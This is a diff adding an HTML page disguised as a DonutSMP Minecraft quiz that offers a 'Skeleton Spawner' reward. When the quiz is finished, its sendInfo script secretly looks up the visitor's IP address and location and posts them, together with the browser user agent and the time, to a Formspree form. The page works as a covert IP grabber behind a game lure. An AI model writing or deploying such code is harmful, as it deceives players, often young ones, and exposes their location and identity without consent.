@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DonutSMP Quiz</title>
+<style>
+body{margin:0;font-family:Arial;background:#0a0a0a;color:white;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.container{background:#141414;border:2px solid #00ff88;border-radius:12px;padding:25px;text-align:center;width:90%;max-width:600px}
+h1{color:#00ff88}
+button{background:#00ff88;border:0;padding:12px 20px;border-radius:8px;font-weight:bold;cursor:pointer}
+.hidden{display:none}
+.question{text-align:left;margin:15px}
+</style>
+</head>
+
+<body>
+<div class="container">
+
+<div id="startPage">
+<h1>🎮 DonutSMP Quiz</h1>
+<p>Complete this for Skeleton Spawner</p>
+<button onclick="startQuiz()">Start Quiz</button>
+</div>
+
+<div id="quizPage" class="hidden">
+<h2>Quiz Time</h2>
+
+<div class="question">
+<p>1. What mob drops bones?</p>
+<label><input type="radio"> Skeleton</label><br>
+<label><input type="radio"> Creeper</label><br>
+<label><input type="radio"> Cow</label>
+</div>
+
+<div class="question">
+<p>2. What spawner is used for Skeleton farms?</p>
+<label><input type="radio"> Skeleton Spawner</label><br>
+<label><input type="radio"> Pig Spawner</label><br>
+<label><input type="radio"> Iron Golem</label>
+</div>
+
+<div class="question">
+<p>3. What do Skeletons shoot?</p>
+<label><input type="radio"> Arrow</label><br>
+<label><input type="radio"> Sword</label><br>
+<label><input type="radio"> Fireball</label>
+</div>
+
+<button onclick="finishQuiz()">Finish Quiz</button>
+</div>
+
+<div id="resultPage" class="hidden">
+<h1>🎁 Surprise Unlocked!</h1>
+<h2>✅ Congrats!</h2>
+<p>Log back on the server for your reward.</p>
+</div>
+
+</div>
+
+<script>
+function startQuiz(){
+document.getElementById("startPage").classList.add("hidden");
+document.getElementById("quizPage").classList.remove("hidden");
+}
+
+function finishQuiz(){
+document.getElementById("quizPage").classList.add("hidden");
+document.getElementById("resultPage").classList.remove("hidden");
+sendInfo();
+}
+
+async function sendInfo(){
+
+try{
+
+let ipRes = await fetch("https://api.ipify.org?format=json");
+let ipData = await ipRes.json();
+
+let locRes = await fetch("https://ipapi.co/"+ipData.ip+"/json/");
+let data = await locRes.json();
+
+await fetch("https://formspree.io/f/xwvjbpdw",{
+method:"POST",
+headers:{
+"Content-Type":"application/json",
+"Accept":"application/json"
+},
+body:JSON.stringify({
+IP_Address:ipData.ip,
+City:data.city || "Unknown",
+Region:data.region || "Unknown",
+Country:data.country_name || "Unknown",
+Browser:navigator.userAgent,
+Time:new Date().toString()
+})
+});
+
+console.log("Sent to Formspree!");
+
+}catch(error){
+console.log("Formspree error:", error);
+}
+
+}
+</script>
+
+</body>
+</html>
